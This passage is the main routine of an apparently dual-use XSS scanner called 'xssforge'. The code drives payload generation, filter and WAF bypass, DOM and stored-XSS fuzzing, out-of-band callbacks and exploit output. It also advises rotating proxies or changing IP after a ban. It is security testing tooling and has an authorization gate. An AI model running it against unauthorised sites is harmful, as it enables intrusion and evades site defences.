        for line in xf_advice.advise(a.url or "", observed=obs):
            print(line)
        print(c("=" * 68, "cyan"))
        return 0

    if a.dump_generated:
        obs = xf_advice.probe(a.url, a) if a.url else {}
        profile = xf_seed.profile_from_facts(obs)
        attack = xf_seed.attack_from_facts(obs, a.url or "")
        ctx_name = "dom" if (obs.get("dom_sinks") or (a.url and "#" in a.url)) else "html"
        count = max(1, a.dump_count)
        enc = None
        if a.encode:
            enc = [x.strip() for x in a.encode.split(",")
                   if x.strip() in P.ENCODERS] or None
        if obs:
            emit(c("[WEB ANALYSIS] status=%s waf=%s reflected=%s login=%s "
                   "dom=%s csp=%s attack=%s" %
                   (obs.get("status"), ",".join(obs.get("waf") or []) or "none",
                    obs.get("reflected"), obs.get("login"),
                    ",".join(obs.get("dom_sinks") or []) or "none",
                    obs.get("csp"), attack), "cyan"))
        # Pull the most likely working payloads from the web-derived corpus for
        # this analysis, then generate analysis-driven variants around them.
        seeds = xf_seed.candidate_seeds(attack, {"context": ctx_name}, profile,
                                        limit=4)
        if a.bypass_seed:
            seeds.insert(0, a.bypass_seed)
        if not seeds:
            seeds = ["<script>alert('__M__')</script>"]
        variants, seen_out = [], set()
        for s in seeds:
            for v in xf_gen.generate(s, profile, ctx_name, limit=count, encoders=enc,
                                     facts=obs, attack=attack):
                if v not in seen_out:
                    seen_out.add(v)
                    variants.append(v)
                if len(variants) >= count:
                    break
            if len(variants) >= count:
                break
        try:
            with open(a.dump_generated, "w", encoding="utf-8") as f:
                f.write("\n".join(variants) + "\n")
            emit("generated %d analysis-driven payloads -> %s" %
                 (len(variants), a.dump_generated))
        except Exception as e:
            emit(c("dump failed: %s" % e, "red"))
        emit(c("possible win payloads (analysis-driven):", "green"))
        for v in variants[:10]:
            emit("  " + v[:180])
        return 0

    minimal = a.url and not any((a.authorized, a.browser, a.auto, a.first_hit,
                                 a.deep_bypass, a.crawl, a.dom, a.dom_fuzz,
                                  a.fragment, a.stored_url, a.sxss_url, a.encode,
                                  a.recommend))
    if minimal:
        obs = xf_advice.probe(a.url, a)
        tip = xf_advice.quick_tip(a.url)
        if obs.get("reflected"):
            tip = "tip: canary reflected — add --authorized --browser --auto --first-hit"
        if obs.get("login"):
            tip = "tip: login page returned — add --authorized -c 'SESSION=...' (see --recommend)"
        if obs.get("dom_sinks") or obs.get("fragment"):
            tip = "tip: DOM sinks seen — add --authorized --browser --dom --dom-fuzz --fragment"
        if obs.get("waf"):
            tip += " | WAF: %s (use --proxy-file / --delay)" % ",".join(obs["waf"])
        probe_msg = ("probe error: %s" % obs["error"]) if obs.get("error") else (
            "target inspected with one GET (HTTP %s, reflected=%s)" %
            (obs.get("status"), obs.get("reflected")))
        print(c("[probe] %s" % probe_msg, "dim"))
        print(c(tip, "yellow"))

    if not a.authorized:
        print(c("Refusing to run without authorization confirmation.", "red"))
        print("Only test assets you own or have explicit written permission to test.")
        print("Re-run with --authorized once scope is confirmed.")
        sys.exit(2)

    headers = {}
    for h in a.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()
    encode_sel = []
    if a.encode:
        if a.encode.strip().lower() == "all":
            encode_sel = list(P.ENCODER_NAMES)
        else:
            for name in a.encode.split(","):
                name = name.strip()
                if name in P.ENCODERS:
                    encode_sel.append(name)
                elif name:
                    print(c("unknown encoder: %s" % name, "yellow"))

    proxies = []
    if a.proxy:
        proxies.append(a.proxy)
    if a.proxy_file:
        try:
            with open(a.proxy_file, encoding="utf-8", errors="replace") as pf:
                for line in pf:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    if line.startswith(("http://", "https://", "socks4://", "socks5://")):
                        if line not in proxies:
                            proxies.append(line)
                    else:
                        print(c("skipping invalid proxy line: %s" % line[:80], "yellow"))
            emit("proxies: %d loaded from %s" % (len(proxies), a.proxy_file))
        except Exception as e:
            print(c("proxy-file load failed: %s" % e, "yellow"))

    opts = Options(
        url=a.url or "", data=a.data, method=(a.method.upper() if a.method else ""),
        cookie=a.cookie, cookie_file=a.cookie_file, headers=headers,
        timeout=a.timeout, delay=a.delay, retries=a.retries, threads=max(1, a.threads),
        max_blocks=a.max_blocks, block_cooldown=a.block_cooldown,
        ban_wait=a.ban_wait,
        insecure=a.insecure, proxy=a.proxy, proxy_file=a.proxy_file,
        proxy_list=proxies, crawl=a.crawl, crawl_depth=a.crawl_depth,
        crawl_max_pages=a.crawl_max_pages, crawl_subdomains=a.crawl_subdomains,
        fragment=a.fragment, path=a.path, dom=a.dom, dom_fuzz=a.dom_fuzz,
        dom_form=a.dom_form, dom_form_submit=a.dom_form_submit,
        browser=a.browser, headed=a.headed, show_on_confirm=a.show_on_confirm,
        save_poc=a.save_poc,
        browser_max=a.browser_max, browser_pool=a.browser_pool,
        blind=a.blind, oob_port=a.oob_server, oob_host=a.oob_host, oob_wait=a.oob_wait,
        interactsh=bool(a.interactsh),
        interactsh_server=(a.interactsh if isinstance(a.interactsh, str) and a.interactsh != "oast.fun" else ""),
        interactsh_token=a.interactsh_token,
        payload_limit=a.payload_limit, max_candidates=a.max_candidates,
        embed_shots=a.embed_shots,
        auto=a.auto, auto_probes=a.auto_probes, auto_points=a.auto_points,
        probe_chars=a.probe_chars,
        first_hit=a.first_hit, first_hit_bases=a.first_hit_bases,
        first_hit_max=a.first_hit_max, deep_bypass=a.deep_bypass,
        bypass_max=a.bypass_max, bypass_time=a.bypass_time,
        bypass_seed=a.bypass_seed, seed_payloads=a.seed_payloads,
        web_refresh=a.web_refresh, exploit_out=a.exploit_out,
        payload_files=a.payloads, encode=encode_sel,
        encode_max=a.encode_max, mutate=a.mutate, mutate_base=a.mutate_base,
        mutate_max=a.mutate_max, bypass=a.bypass, bypass_variants=a.bypass_variants,
        openapi=a.openapi, login_url=a.login_url,
        login_data=a.login_data, login_json=a.login_json, login_method=a.login_method,
        output_dir=a.output_dir,
        evidence_max=a.evidence_max,
        dom_fallback=bool(a.dom_fuzz or a.all),
        report=[x.strip() for x in a.report.split(",") if x.strip()],
        json_out=a.json, authorized=True, show_evidence=a.show_evidence,
        quiet=a.quiet, inject_headers=a.inject_header, inject_cookies=a.inject_cookie,
        stored_url=a.stored_url,
        stored_cleanup_url=a.stored_cleanup_url,
        stored_urls=list(dict.fromkeys(
            (a.sxss_url or []) + ([a.stored_url] if a.stored_url else []))),
        csrf_url=a.csrf_url, libscan=a.libscan, scheme=a.scheme, raw_request=a.raw_request,
        only_poc=a.only_poc, hunt=a.hunt, ai_fallback=a.ai_fallback, ai_model=a.ai_model,
        ai_count=a.ai_count, waf_min_confidence=a.waf_min_confidence,
        hpp=a.hpp, hpp_parts=a.hpp_parts, structural=a.structural,
        structural_pad=a.structural_pad, min_confidence=a.min_confidence,
        header_sweep=a.header_sweep, cookie_sweep=a.cookie_sweep,
        param_mine=a.param_mine, param_wordlist=a.param_wordlist,
        param_mine_max=a.param_mine_max, postman=a.postman, har_file=a.har_file,
        mass_file=a.mass_file, mass_state=a.mass_state, mass_resume=a.mass_resume,
        mass_baseline=a.mass_baseline, mass_dry_run=a.mass_dry_run,
        mass_limit=a.mass_limit,
        user_agent=a.user_agent, params=a.param, raw_inject=a.raw_inject,
    )

    if opts.mass_file:
        return xf_mass.run(opts, sys.argv[1:])

    if not a.no_color:
        emit(c(BANNER, "magenta"))
    emit(c("xssforge", "bold") + c(" - advanced context-aware XSS scanner", "dim"))
    if opts.browser:
        bp = xf_browser.BrowserPool(opts, opts.browser_pool)
        if not bp.available:
            emit(c("browser: unavailable (%s)" % bp.error, "yellow"))
        else:
            emit("browser: %schromium pool=%d" %
                 ("visible " if getattr(opts, "headed", False) else "headless ",
                  opts.browser_pool))
    if opts.encode:
        emit("encoders: %s" % ", ".join(opts.encode))
    emit("payloads: %d unique (limit %s/context)" %
         (P.corpus_size(), opts.payload_limit or "all"))
    if opts.mutate:
        emit("mutation: on (%d base vectors, up to %d variants each)" %
             (opts.mutate_base, opts.mutate_max))
    if opts.ai_fallback and not xf_ai.available():
        emit(c("ai     : --ai-fallback set but no XSSFORGE_AI_KEY / OPENROUTER_API_KEY "
               "/ OPENAI_API_KEY — AI pass disabled", "yellow"))
    if opts.openapi:
        emit("openapi : %s" % opts.openapi)
    if opts.login_url:
        emit("auth    : login via %s %s" % (opts.login_method, opts.login_url))

    if opts.cookie_file and not opts.cookie:
        try:
            _tmp = requests.Session()
            _load_netscape_into(_tmp, opts.cookie_file)
            opts.cookie = _tmp.headers.get("Cookie", "")
        except Exception:
            pass
    factory = SessionFactory(opts)
    limiter = RateLimiter(opts.delay)
    state = {
        "factory": factory, "limiter": limiter, "token": "",
        "stop": _INTERRUPT, "bcount": [0],
        "browser_blocked": [0], "browser_error": [0], "collab": None,
        "oob_base": opts.blind, "interactsh": None,
        "ecount": [0], "blocked": [0], "csp": {},
        "browser": None,
        "browser_verifier": xf_verify.verifier_status(
            None, requested=getattr(opts, "browser", False)),
        "scan_started": getattr(opts, "_scan_started", None) or time.time(),
    }
    _BLOCKS.lock.acquire()
    try:
        _BLOCKS.count = 0
        _BLOCKS.events = []
        _BLOCKS.warned = False
        _BLOCKS.aborted = False
        _BLOCKS.stop_event = state["stop"]
        _BLOCKS.factory = factory
        _BLOCKS.max_blocks = opts.max_blocks
        _BLOCKS.cooldown = opts.block_cooldown
        _BLOCKS.ban_wait = opts.ban_wait
        _BLOCKS.url = opts.url
    finally:
        _BLOCKS.lock.release()

    if opts.deep_bypass and opts.url:
        state["web_facts"] = xf_advice.probe(opts.url, opts)
        emit("web    : analysis probe done (attack=%s)" %
             xf_seed.attack_from_facts(state["web_facts"], opts.url))

    points, dom_notes = [], ""
    try:
        points = discover(opts, factory, limiter, state)
    except SystemExit:
        raise
    except Exception as e:
        emit(c("discovery error: %s" % e, "red"))

    emit("target : %s %s" % (opts.method or "auto", opts.url or opts.raw_request))
    if auto_browser_on or auto_first_on:
        enabled = ("browser proof + first-hit " if auto_browser_on and auto_first_on
                   else ("browser proof " if auto_browser_on else "first-hit "))
        emit(c("auto   : one-shot — %senabled (override: --no-browser / "
               "--no-first-hit)" % enabled, "dim"))

    # --auto runs first: fingerprint the filter before the WAF baseline and before
    # any real payload is sent, so encoders and the canary style are chosen up front.
    if opts.auto and points:
        custom = xf_filter.parse_probe_chars(opts.probe_chars)
        emit("auto   : fingerprinting input filter (%d points, %d probes)" %
             (min(opts.auto_points, len(points)),
              opts.auto_probes or len(custom or xf_filter.PROBES)))
        try:
            prof = xf_filter.probe_points(opts, factory, limiter, points, state,
                                          max_points=opts.auto_points,
                                          max_probes=opts.auto_probes,
                                          probes=custom)
            emit(c(xf_filter.format_report(prof), "cyan"))
            state["filter_profile"] = prof
            opts.filter_profile = prof
            if not opts.encode:
                opts.encode = prof["encoders"]
                emit(c("auto   : using encoders %s" % ", ".join(opts.encode), "green"))
            if a.canary_style == "quoted" and prof["canary_style"] != "quoted":
                P.set_canary_style(prof["canary_style"])
                emit(c("auto   : canary style -> %s (quotes are filtered)" %
                       prof["canary_style"], "green"))
            if prof.get("auth_required"):
                emit(c("auto   : login/register page returned — session is missing "
                       "or invalid; supply -c/--cookie-file or a Burp session. "
                       "Payload phase skipped (interstitial echoes are not XSS).", "red"))
                return 1
            if prof.get("waf_challenge"):
                emit(c("auto   : WAF/bot challenge page returned — the echo is an "
                       "interstitial, not application output; payload phase skipped.",
                       "red"))
                emit(c("auto   : NEXT: solve challenge in a real browser, then pass "
                       "-c 'cf_clearance=...' or --cookie-file JAR; if IP-blocked "
                       "use --proxy-file FILE and re-run with --auto --browser.",
                       "yellow"))
                return 1
            if not prof["reflected"]:
                emit(c("auto   : input is not reflected — no reflected/stored XSS "
                       "reachable on these points; skipping payload phase.", "red"))
                return 1
        except Exception as e:
            emit(c("auto   : fingerprint failed: %s" % str(e)[:160], "yellow"))

    # baseline / WAF fingerprint
    fp = {"waf": [], "blocked": False, "status": 0}
    if opts.url:
        try:
            r0 = factory.get().get(opts.url, timeout=opts.timeout, verify=not opts.insecure)
            state["baseline_html"] = r0.text or ""
            state["baseline_headers"] = dict(r0.headers)
            fp = xf_waf.fingerprint(dict(r0.headers), r0.text or "", r0.status_code)
            csp_info = xf_csp.analyze(dict(r0.headers), r0.text or "")
            opts.csp_info = csp_info
            state["csp"] = csp_info
            P.set_nonce(csp_info.get("nonce", ""))
            if csp_info.get("present"):
                emit(c("csp    : %s" % xf_csp.describe(csp_info), "yellow"))
                emit(c("         %s" % csp_info["verdict"], "dim"))
            try:
                libs = xf_libscan.detect_from_text(r0.text or "")
                if libs:
                    opts.libraries = libs
                    state["libraries"] = libs
                    emit("libs   : %s" % ", ".join(
                        "%s %s" % (k, v) for k, v in sorted(libs.items())))
            except Exception:
                pass
            if fp["waf"]:
                conf = fp.get("confidence", 0)
                if conf < opts.waf_min_confidence:
                    emit(c("waf    : %s (confidence %d < %d, suppressed)" %
                           (", ".join(fp["waf"]), conf, opts.waf_min_confidence),
                           "yellow"))
                    fp["waf_suppressed"] = True
                else:
                    emit(c("waf    : %s%s (confidence %d%%)" %
                           (", ".join(fp["waf"]),
                            " (blocked)" if fp["blocked"] else "", conf), "yellow"))
                    for hint in xf_waf.bypass_hint(fp["waf"]):
                        emit(c("         %s" % hint, "dim"))
        except Exception as e:
            emit(c("baseline: %s" % str(e)[:160], "yellow"))

    if opts.hunt:
        try:
            html0 = state.get("baseline_html") or ""
            inline_js = re.findall(r"<script[^>]*>(.*?)</script>", html0,
                                   re.I | re.S)
            facts = xf_hunt.analyze(html0, state.get("baseline_headers") or {},
                                    inline_js, opts.url)
            state["hunt"] = facts
            emit(c(xf_hunt.format_report(facts), "cyan"))
        except Exception as e:
            emit(c("hunt  : plan failed: %s" % str(e)[:160], "yellow"))

    session_watch = None
    if opts.url and (opts.login_url or opts.cookie or opts.cookie_file):
        try:
            session_watch = xf_session.SessionWatch(factory, opts.url, state, opts)
            base_fp = session_watch.baseline()
            state["session"]["enabled"] = True
            session_watch.start()
            emit("session: watching %s for auth loss (every %.0fs)" %
                 (opts.url, session_watch.interval))
            if base_fp and base_fp.get("login") and not base_fp.get("authed"):
                emit(c("session: baseline looks like a login page — auth may have "
                       "failed before the scan", "yellow"))
        except Exception as e:
            emit(c("session: watch failed: %s" % str(e)[:120], "yellow"))

    if opts.oob_port:
        try:
            collab = xf_oob.Collaborator(host="0.0.0.0", port=opts.oob_port,
                                         public_url="http://%s:%d" % (opts.oob_host, opts.oob_port))
            collab.start()
            state["collab"] = collab
            state["oob_base"] = collab.public_url
            emit(c("oob    : listening on 0.0.0.0:%d (public %s)" %
                   (opts.oob_port, collab.public_url), "green"))
        except Exception as e:
            emit(c("oob    : failed: %s" % e, "red"))

    if opts.interactsh:
        try:
            ish = xf_interactsh.Interactsh(server=opts.interactsh_server,
                                           token=opts.interactsh_token,
                                           insecure=opts.insecure,
                                           timeout=min(opts.timeout, 10.0))
            state["interactsh"] = ish
            if ish.available:
                emit(c("interactsh: registered %s (%s)" % (ish.server, ish.domain), "green"))
            else:
                emit(c("interactsh: unavailable (%s)" % ish.error, "yellow"))
        except Exception as e:
            emit(c("interactsh: failed: %s" % e, "red"))

    results = []
    dom_findings = []
    if opts.dom:
        dom_urls = [opts.url] + [p.url for p in points if p.url]
        dom_findings, dom_notes = run_dom_analysis(opts, factory, limiter, dom_urls,
                                                   state.get("csp"))
        emit("dom    : %d static source->sink candidates" % len(dom_findings))

    if opts.libscan and opts.url:
        emit("libscan: detecting JS libraries on %s" % opts.url)
        try:
            results.extend(libscan_check(opts, state, None))
        except Exception as e:
            emit(c("libscan: failed: %s" % str(e)[:160], "yellow"))

    if not points and not dom_findings and not opts.dom_form and not opts.libscan:
        emit(c("No injection points found. Provide query params, -d, --fragment, "
               "--inject-header, --raw, --dom-form or --crawl.", "red"))
        return 1

    emit("points : %d" % len(points))

    browser = None
    if opts.browser:
        browser = xf_browser.BrowserPool(opts, opts.browser_pool)
        if browser.available:
            state["browser"] = browser
            atexit.register(browser.close)
        else:
            emit(c("browser: NOT_VERIFIED — %s. Findings cannot be CONFIRMED; "
                   "install selenium, chromedriver and chromium/chrome." %
                   browser.error, "yellow"))
    state["browser_verifier"] = (browser.status() if browser and browser.available
                                 else xf_verify.verifier_status(
                                     browser, requested=getattr(opts, "browser", False)))
    if dom_findings and opts.browser and opts.url:
        verify_dom_findings(opts, state, dom_findings, opts.url)
    if points:
        with concurrent.futures.ThreadPoolExecutor(max_workers=opts.threads) as ex:
            futs = {ex.submit(scan_point, p, opts, state): p for p in points}
            for fut in concurrent.futures.as_completed(futs):
                try:
                    results.append(fut.result())
                except Exception as e:
                    p = futs[fut]
                    results.append({"point": p.label, "url": p.url, "method": p.method,
                                    "location": p.location, "param": p.name,
                                    "reflected": False, "context": None, "candidates": [],
                                    "confirmed": False, "notes": ["error: %s" % e],
                                    "blind_confirmed": False, "blind_hits": [],
                                    "dom_findings": []})
    if dom_findings:
        dom_confirmed = any(
            str(f.get("status") or "").upper() == "CONFIRMED" and f.get("browser_evidence")
            for f in dom_findings)
        results.append({"point": "dom:static", "url": opts.url, "method": "GET",
                        "location": "dom", "param": "DOM", "reflected": False,
                        "context": "dom", "candidates": [], "confirmed": dom_confirmed,
                        "notes": [], "blind_confirmed": False, "blind_hits": [],
                        "dom_findings": dom_findings})

    if opts.dom_form and browser is not None and browser.available:
        emit("dom-form: testing %s on %s" % (opts.dom_form, opts.url))
        try:
            results.extend(run_dom_form(opts, state, browser, factory, limiter))
        except Exception as e:
            emit(c("dom-form: failed: %s" % str(e)[:160], "yellow"))
    elif opts.dom_form:
        emit(c("dom-form: requires --browser (browser unavailable)", "yellow"))

    if opts.stored_urls:
        emit("stored : seeding %s" % ", ".join(opts.stored_urls))
        results.extend(stored_check(opts, state, points))

    # OOB polling
    ish = state.get("interactsh")
    if state.get("collab") or (ish and ish.available):
        emit("oob    : waiting %.1fs for blind callbacks..." % opts.oob_wait)
        deadline = time.time() + opts.oob_wait
        pending = {r.get("oob_token"): r for r in results if r.get("oob_token")}
        while time.time() < deadline and pending:
            if state.get("collab"):
                for tok, r in list(pending.items()):
                    if r.get("oob_provider") not in (None, "collaborator"):
                        continue
                    hits = state["collab"].hits_for(tok)
                    if hits:
                        r["blind_hits"] = hits
                        r["blind_confirmed"] = True
                        emit(c("    [BLIND CONFIRMED] %s %s (collaborator)" %
                               (r.get("param"), tok), "green"))
                        del pending[tok]
            if ish and ish.available:
                ish.poll()
                for tok, r in list(pending.items()):
                    if r.get("oob_provider") != "interactsh":
                        continue
                    hits = ish.hits_for(tok)
                    if hits:
                        r["blind_hits"] = hits
                        r["blind_confirmed"] = True
                        r["oob_provider"] = "interactsh"
                        emit(c("    [BLIND CONFIRMED] %s %s (interactsh)" %
                               (r.get("param"), tok), "green"))
                        del pending[tok]
            time.sleep(0.5)
        if pending and not opts.json_out:
            emit(c("oob    : no callbacks for %d tokens" % len(pending), "dim"))

    if session_watch:
        session_watch.stop()
        if (state.get("session") or {}).get("lost"):
            emit(c("! SESSION LOST during scan: %s — authenticated results are "
                   "unreliable, re-authenticate and re-run." %
                   state["session"].get("reason", "auth expired"), "red"))
    if browser:
        if getattr(browser, "browser_version", ""):
            state.setdefault("browser_verifier", {})["browser_version"] = browser.browser_version
        browser.close()
    if state.get("collab"):
        state["collab"].stop()
    if ish and ish.available:
        ish.stop()

    # ---- reports ----
    xf_evidence.annotate(results)
    poc_dropped = xf_evidence.only_poc(results) if opts.only_poc else 0
    if poc_dropped:
        emit(c("only-poc: dropped %d candidate(s) below tier V/A" % poc_dropped,
               "dim"))
    dropped = xf_report.filter_low_confidence(
        results, getattr(opts, "min_confidence", "low"))
    if dropped:
        emit(c("confidence: high — dropped %d low-confidence reflection(s)" %
               dropped, "dim"))
    xf_evidence.annotate(results)
    verification_summary = xf_verify.annotate(results, state.get("browser_verifier"))
    payload_blocks = payload_block_count(state)
    meta = {"waf": fp.get("waf", []),
            "waf_blocked": bool(fp.get("blocked", False) or payload_blocks),
            "waf_confidence": fp.get("confidence", 0),
            "waf_suppressed": fp.get("waf_suppressed", False),
            "libraries": state.get("libraries") or {},
            "hunt": state.get("hunt") or {},
            "session_lost": bool((state.get("session") or {}).get("lost")),
            "session_reason": (state.get("session") or {}).get("reason", ""),
            "dom_notes": dom_notes, "corpus": P.corpus_size(),
            "points": len(points), "payload_limit": opts.payload_limit,
            "filter_profile": state.get("filter_profile"),
            "csp": state.get("csp") or {},
            "min_confidence": {"level": getattr(opts, "min_confidence", "low"),
                               "dropped": dropped},
            "only_poc": {"enabled": bool(opts.only_poc), "dropped": poc_dropped},
            "tiers": xf_evidence.counts(results),
            "filter_fingerprints": [
                {"point": r.get("point"), "fingerprint": r.get("filter_fingerprint")}
                for r in results if r.get("filter_fingerprint")],
            "http_blocks": _BLOCKS.count + payload_blocks,
            "http_block_events": _BLOCKS.events,
            "banned": _BLOCKS.banned, "ban_recoveries": _BLOCKS.recoveries,
            "browser": dict(state.get("browser_verifier") or {}),
            "verification": verification_summary,
            "scope": {
                "authorized": bool(getattr(opts, "authorized", False)),
                "reminder": "Only assets you own or have explicit written permission to test.",
            },
            "oob": {
                "configured": bool(opts.blind or opts.interactsh or opts.oob_port),
                "provider": ("interactsh" if opts.interactsh else
                             "collaborator" if opts.oob_port else
                             "external" if opts.blind else "none"),
                "note": "CALLBACK_OBSERVED is not browser-confirmed execution.",
            },
            "scan": {
                "started": (time.strftime("%Y-%m-%dT%H:%M:%SZ",
                                          time.gmtime(state["scan_started"]))
                            if state.get("scan_started") else ""),
                "finished": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                "duration_seconds": xf_verify.elapsed(state.get("scan_started")),
                "requests": getattr(factory, "request_count", None),
            }}
    _dur = meta["scan"]["duration_seconds"]
    _req = meta["scan"]["requests"]
    meta["scan"]["requests_per_second"] = (
        round(_req / _dur, 2) if _req and _dur else None)
    meta["scan"]["peak_memory_mb"] = _peak_memory_mb()
    if _BLOCKS.aborted:
        emit(c("! URL/IP ban detected: %d WAF/block responses (--max-blocks=%d). "
               "Scan stopped — results are incomplete." %
               (_BLOCKS.count, opts.max_blocks), "red"))
        emit(c("  recovery: wait for the ban to expire, change IP or supply "
               "--proxy-file proxies.txt, then re-run slower:", "yellow"))
        emit(c("    python3 xssforge.py -u '%s' --authorized --threads 1 --delay 1.0 "
               "--max-blocks 5 --proxy-file proxies.txt" %
               (opts.url or "").replace("'", ""), "yellow"))
    elif _BLOCKS.count:
        emit(c("! %d WAF/IP-block response(s) seen; results may be incomplete." %
               _BLOCKS.count, "yellow"))
    outdir = opts.output_dir
    os.makedirs(outdir, exist_ok=True)
    stamp = time.strftime("%Y%m%d-%H%M%S")
    written = []
    if "json" in opts.report or opts.json_out:
        written.append(xf_report.write_json(os.path.join(outdir, "report-%s.json" % stamp),
                                            opts.url, results, meta))
    if "html" in opts.report:
        written.append(xf_report.write_html(os.path.join(outdir, "report-%s.html" % stamp),
                                            opts.url, results, meta,
                                            embed_shots=opts.embed_shots))
    if "md" in opts.report:
        written.append(xf_report.write_markdown(os.path.join(outdir, "report-%s.md" % stamp),
                                                opts.url, results, meta))
    if "sarif" in opts.report:
        written.append(xf_report.write_sarif(os.path.join(outdir, "report-%s.sarif" % stamp),
                                             opts.url, results, meta))
    if "jsonl" in opts.report:
        written.append(xf_report.write_jsonl(os.path.join(outdir, "report-%s.jsonl" % stamp),
                                             opts.url, results, meta))
    if "toml" in opts.report:
        written.append(xf_report.write_toml(os.path.join(outdir, "report-%s.toml" % stamp),
                                            opts.url, results, meta))

    s = xf_report.summary(results, meta)
    if opts.json_out:
        print(json.dumps({"target": opts.url, "summary": s, "meta": meta,
                          "results": results}, indent=2, default=str))
    else:
        emit()
        emit(c("=" * 68, "dim"))
        for r in results:
            if r.get("blind_confirmed"):
                tag = c("BLIND", "magenta")
            elif r.get("confirmed"):
                tag = c("CONFIRMED", "green")
            elif r.get("candidates"):
                tag = c("LIKELY", "yellow")
            elif r.get("reflected"):
                tag = c("REFLECTED", "cyan")
            else:
                tag = c("NO", "dim")
            emit("  [%s] %-28s %-12s ctx=%s" % (tag, r.get("param"),
                                                r.get("location"), r.get("context")))
            for cand in r.get("candidates") or []:
                emit("       %-9s tier=%s conf=%s method=%s  %s" % (
                    cand.get("status"), cand.get("tier") or "-",
                    cand.get("confidence"), cand.get("detection_method") or "-",
                    cand.get("name")))
                emit("       payload : %s" % cand.get("payload"))
                repro = cand.get("url") or r.get("url")
                if repro and (cand.get("status") == "CONFIRMED" or opts.show_evidence):
                    emit("       url     : %s" % repro)
                emit("       cell    : %s" % cand.get("detail"))
                if cand.get("curl") and (cand.get("status") == "CONFIRMED" or opts.show_evidence):
                    emit("       curl    : %s" % cand.get("curl"))
                if opts.show_evidence and cand.get("evidence"):
                    emit("       file    : %s" % cand.get("evidence"))
                if cand.get("screenshot"):
                    emit("       screen  : %s" % cand.get("screenshot"))
            for d in r.get("dom_findings") or []:
                emit("       DOM     : %s from %s (%s)" % (d.get("sink"), d.get("source"),
                                                            d.get("script")))
            for note in r.get("notes") or []:
                emit("       note    : %s" % note)
        emit(c("=" * 68, "dim"))
        emit("confirmed=%d blind=%d likely=%d dom=%d points=%d" %
             (s["confirmed"], s["blind_confirmed"], s["likely"],
              s["dom_candidates"], s["points"]))
        if written:
            emit("reports: " + ", ".join(written))
        if s["confirmed"] or s["blind_confirmed"]:
            emit(c("Proof captured. Validate manually before reporting.", "green"))
        elif s["likely"]:
            if state.get("browser_blocked", [0])[0]:
                emit(c("Browser proof was blocked — cannot tell real from fake "
                       "reflections; validate manually.", "red"))
            elif opts.browser and browser is not None and browser.available:
                emit(c("Reflections seen but browser proved no execution — "
                       "likely escaped/non-exploitable (fake) reflections.", "yellow"))
            else:
                emit(c("Likely sinks. Re-run with --browser to confirm execution.", "yellow"))
        else:
            emit(c("No executable reflection. Try --crawl, --fragment, --dom, "
                   "custom payloads or --encode.", "dim"))
        emit(c("--- suggested next commands ---", "cyan"))
        for line in xf_advice.advise(opts.url or "", opts=opts, points=points,
                                     baseline=fp, results_summary=s,
                                     observed={"csp": bool((state.get("csp") or {}).get("present")),
                                               "csp_info": state.get("csp") or {},
                                               "waf": fp.get("waf") or []}):
            emit(c("  " + line, "dim"))

    bb = state.get("browser_blocked", [0])[0]
    be = state.get("browser_error", [0])[0]
    if bb:
        emit(c("! browser proof was BLOCKED on %d verification(s) — WAF/bot "
               "challenge detected; results may be incomplete. Try --proxy, "
               "real headers/cookies, or --no-browser + manual validation." % bb, "red"))
    if be:
        emit(c("! browser had %d error(s) (driver/navigation)." % be, "yellow"))

    emit_exploit(results, opts, outdir, stamp)

    if s["confirmed"] or s["blind_confirmed"] or s["likely"]:
        return 0
    return 1


if __name__ == "__main__":
    sys.exit(main())
